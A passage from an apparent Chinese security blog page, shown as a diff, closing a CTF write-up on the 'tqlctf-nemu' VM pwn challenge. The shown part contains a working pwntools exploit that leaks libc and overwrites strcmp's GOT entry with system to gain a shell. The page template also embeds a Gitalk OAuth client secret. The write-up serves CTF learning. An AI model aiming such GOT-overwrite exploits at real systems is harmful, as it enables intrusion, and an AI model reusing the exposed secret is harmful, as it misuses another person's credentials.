int(io.recvuntil(&#x27;\n&#x27;,drop=True),16) # the high addr</span></span><br><span class="line"><span class="comment"># libc_info = (libc_info2 &lt;&lt; 32) + (libc_info1)</span></span><br><span class="line"><span class="comment"># success(&quot;libc_info: &quot; + hex(libc_info))</span></span><br><span class="line"><span class="comment"># libc_base = libc_info - 0x3c4ce8</span></span><br><span class="line"><span class="comment"># success(&quot;libc_base: &quot; + hex(libc_base))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># set head to sth before GOT</span></span><br><span class="line">send(<span class="string">&#x27;set 0x8000448 0x60eff0&#x27;</span>)</span><br><span class="line"><span class="comment"># debug(False)</span></span><br><span class="line">send(<span class="string">&#x27;info w&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">libc_info1 = <span class="built_in">int</span>(io.recvuntil(<span class="string">&#x27; &#x27;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">libc_info2 = <span class="built_in">int</span>(io.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>)</span><br><span class="line">libc_info = (libc_info2&lt;&lt;<span class="number">32</span>)+libc_info1</span><br><span class="line">success(<span class="string">&quot;libc_info: &quot;</span> + <span class="built_in">hex</span>(libc_info))</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">libc_base = libc_info - <span class="number">0x084540</span></span><br><span class="line">success(<span class="string">&quot;libc_base: &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="comment"># io.recvuntil(&#x27;0x&#x27;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">strcmp_got = <span class="number">0x000000000060f0f0</span></span><br><span class="line">system = (libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]) &amp;<span class="number">0xffffffff</span></span><br><span class="line">target_addr = strcmp_got -<span class="number">0x30</span></span><br><span class="line">send(<span class="string">&#x27;set 0x8000448 0&#x27;</span>)</span><br><span class="line"><span class="comment"># change head to strcmp&#x27;s got</span></span><br><span class="line">send(<span class="string">&#x27;set 0x8000440 0x%x&#x27;</span> % target_addr)</span><br><span class="line"><span class="comment"># change</span></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">send(<span class="string">&#x27;w 0x%x&#x27;</span> % system)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">info(<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>总结一下：一个完全无限制的越界读写问题。但是看似简单，读写操作的时候还需要经过一些检查。很值得一做。很适合作为VM pwn的入门题目仔细分析(正好也有源码，漏洞很经典)</p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2022/02/23/tqlctf-nemu/">tqlctf-nemu</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页"></a></p>
+        <p><span>发布时间:</span>2022-02-23, 21:20:25</p>
+        <p><span>最后更新:</span>2022-02-24, 15:58:14</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2022/02/23/tqlctf-nemu/" title="tqlctf-nemu">https://nicholas-wei.github.io/2022/02/23/tqlctf-nemu/</a>
+            <span class="copy-path" data-clipboard-text="原文: https://nicholas-wei.github.io/2022/02/23/tqlctf-nemu/　　作者: " title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+            <div id="article-nav-newer" class="article-nav-title">
+                <a href="/2022/02/28/SUSCTF2022-pwn/">
+                    SUSCTF2022-pwn
+                </a>
+            </div>
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2022/02/23/fastbin-reverse-into-tcache/">
+                    fastbin-reverse-into-tcache
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">文章目录</strong>
+        
+            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">题目分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#cmd-help"><span class="toc-number">1.1.</span> <span class="toc-text">cmd_help</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cmd-c"><span class="toc-number">1.2.</span> <span class="toc-text">cmd_c</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cmd-si"><span class="toc-number">1.3.</span> <span class="toc-text">cmd_si</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cmd-info"><span class="toc-number">1.4.</span> <span class="toc-text">cmd_info</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cmd-x"><span class="toc-number">1.5.</span> <span class="toc-text">cmd_x</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cnd-w"><span class="toc-number">1.6.</span> <span class="toc-text">cnd_w</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cmd-p"><span class="toc-number">1.7.</span> <span class="toc-text">cmd_p</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cmd-set"><span class="toc-number">1.8.</span> <span class="toc-text">cmd_set</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2libc%E5%9C%B0%E5%9D%80"><span class="toc-number">2.1.</span> <span class="toc-text">泄露libc地址</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%99%E5%85%A5system"><span class="toc-number">2.2.</span> <span class="toc-text">写入system</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp"><span class="toc-number">2.3.</span> <span class="toc-text">exp</span></a></li></ol></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-3 i,
+        .toc-level-3 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+    <script>
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
+    </script>
+
+
+
+    
+<div class="share">
+    
+        <div class="bdsharebuttonbox">
+            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
+            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
+            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
+            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
+            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
+            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></i></a>
+        </div>
+        <script>
+            window._bd_share_config={
+                "common":{"bdSnsKey":{},"bdText":"tqlctf-nemu　| welc0me　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+        </script>
+    
+
+    
+</div>
+
+
+
+
+
+
+<!-- 
+    
+ -->
+
+
+  
+      <section id='comments' style='margin: 2em; padding: 2em; background: rgba(255, 255, 255, 0.5)'>
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+    <script src="https://unpkg.com/gitalk@latest/dist/gitalk.min.js"></script>
+    <div id="gitalk-container"></div>
+    <script type="text/javascript">
+      var gitalk = new Gitalk({
+        clientID: 'fb4ffdde2e800246e49f',
+        clientSecret: 'b550860fb0906da0fc324e3c81448cd676b55f9e',
+        repo: 'nicholas-wei.github.io',
+        owner: 'nicholas-wei',
+        admin: ['nicholas-wei'],
+        id: window.location.pathname
+      })
+      gitalk.render('gitalk-container')
+    </script>
+  </section>
+  
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/2022/02/28/SUSCTF2022-pwn/" title="上一篇: SUSCTF2022-pwn">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2022/02/23/fastbin-reverse-into-tcache/" title="下一篇: fastbin-reverse-into-tcache">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2023/07/12/testfile/">testfile</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/05/03/decrypt-wechat-db/">decrypt-wechat-db</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/05/02/tamuctf-pwnme/">tamuctf-pwnme</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/03/20/ej/">ej</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/02/07/royal_ransomeware/">royal_randomeware analysis</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/02/05/mirai/">mirai_botnet_analysis</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/01/26/corctf2022-corchat/">corctf2022-corchat</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/01/24/bi0sctf-2023/">bi0sctf-2023</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/01/20/rwctf-tinyvm/">rwctf-tinyvm</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/01/19/wasm-pwn/">wasm-1</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/12/27/ics-pa1/">ics-pa</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/11/13/llvm-pass1/">llvm-pass1</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/09/14/leetcode-1/">leetcode-1</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/08/28/dp/">dp</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/08/19/Directed-Grey-Box-Fuzzing-with-Provable-Path-Pruning/">Directed_Grey-Box_Fuzzing_with_Provable_Path_Pruning</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/08/13/Constraint-guided-Directed-Greybox-Fuzzing/">Constraint-guided_Directed_Greybox_Fuzzing</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/08/10/crafting-interpreters4/">crafting-interpreters4</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/08/07/crafting-interpreters3/">crafting-interpreters3</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/08/04/crafting-interpreters2/">crafting-interpreters2——scanning</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/08/02/house-of-cat/">house-of-cat</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/07/29/crafting-interpreters1/">crafting_interpreters 1</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/07/28/dice2022-hope/">dice2022@hope</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/05/30/software-security-lab6/">software-security-lab6</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/05/18/software-security-lab5/">software-security-lab5</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/05/18/volgaCTF2022-pwn/">volgaCTF2022_pwn</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/05/08/pyjail/">pyjail</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/05/05/angstormCTF2022-pwn/">angstormCTF2022_pwn</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/05/04/software-security-lab4/">software-security-lab4</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/27/pwnhub2022/">pwnhub2022_easyrop</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/25/b01lersCTF2022-pwn/">b01lersCTF2022_pwn</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/15/hackpark2022-shiftycode/">hackpark2022_shiftycode</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/14/input_check_lab/">software-security-lab3</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/07/software-security-lab2/">software-security-lab2</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/07/matlab-2/">matlab-2</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/04/FuzzBuilder-src-understand/">FuzzBuilder_src_understand</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/04/SpaceHeroCTF2022-pwn-wp/">SpaceHeroCTF2022_pwn_wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/01/fb-bot-discord/">fb-bot_discord</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/31/matlab-1/">matlab-1</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/29/zer0pts2022-accountant/">zer0pts2022_accountant</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/17/fuzzing-6-grammer-fuzzing/">fuzzing-6-grammer_fuzzing</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/16/fuzzing-5-parallelize/">fuzzing-5-parallelize</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/15/fuzzing-4-code_coverage/">fuzzing-4</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/13/fuzzing-2/">fuzzing-2</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/09/software-security-lab1/">software-security_lab1</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/09/fuzzing-1-gegeral-knowledge/">fuzzing-1-gegeral_knowledge</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/07/umdctf2022-pwn/">umdctf2022-pwn</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/06/kernel-6-HijackPrctl/">kernel-6-HijackPrctl</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/02/pwnable-re-alloc-revenge/">pwnable-re-alloc_revenge</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/02/28/SUSCTF2022-pwn/">SUSCTF2022-pwn</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/02/23/tqlctf-nemu/">tqlctf-nemu</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/02/23/fastbin-reverse-into-tcache/">fastbin-reverse-into-tcache</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/02/15/kernel-5-bypass-smep1/">kernel-5-bypass_smep1</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/02/14/pwnable-babystack/">pwnable-babystack</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/02/11/kernel-4-doubleFetch/">kernel-4-doubleFetch</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/02/07/tcache-stashing-unlink-attack/">tcache-stashing-unlink-attack</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/02/03/IO-file-vtable/">IO_file常见利用方法&原理(二)</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/02/01/pwnable-realloc/">pwnable-realloc</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/31/kernel-3-UAF/">kernel-3-UAF</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/29/IO-file/">IO_file常见利用方法&原理(一)</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/29/largebin-attack/">largebin-attack</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/28/hws2022%E5%86%AC%E4%BB%A4%E8%90%A5ctf/">hws2022冬令营入营赛pwn</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/27/RWctf-2022-svme/">RWctf-2022-svme</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/24/kernel-2-stkof/">kernel-2-stkof</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/23/kernel-1-basic_knowledge/">kernel-1-basic_knowledge</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/22/Drangonctf2021-noflippidy/">Drangonctf2021-noflippidy</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/21/dicectf2021-flippidy/">dicectf2021_flippidy</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i> 
+                2022-2023 nich0las
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>| </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+    </div>
+    
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 1;
+                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        var oOpenInNew = {
+            
+            
+            
+            
+            
+            
+             archives: ".archive-article-title", 
+             miniArchives: "a.post-list-link", 
+            
+             friends: "#js-friends a", 
+             socail: ".social a" 
+        }
+        for (var x in oOpenInNew) {
+            $(oOpenInNew[x]).attr("target", "_blank");
+        }
+    
+</script>
+
+    <script>
+        var originTitle = document.title;
+        var titleTime;
+        document.addEventListener("visibilitychange", function() {
+            if (document.hidden) {
+                document.title = "(つェ⊂) 我藏好了哦~ " + originTitle;
+                clearTimeout(titleTime);
+            }
+            else {
+                document.title = "(*´∇｀*) 被你发现啦~ " + originTitle;
+                titleTime = setTimeout(function() {
+                    document.title = originTitle;
+                }, 2000);
+            }
+        })
+    </script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div>
+</body>
+</html>
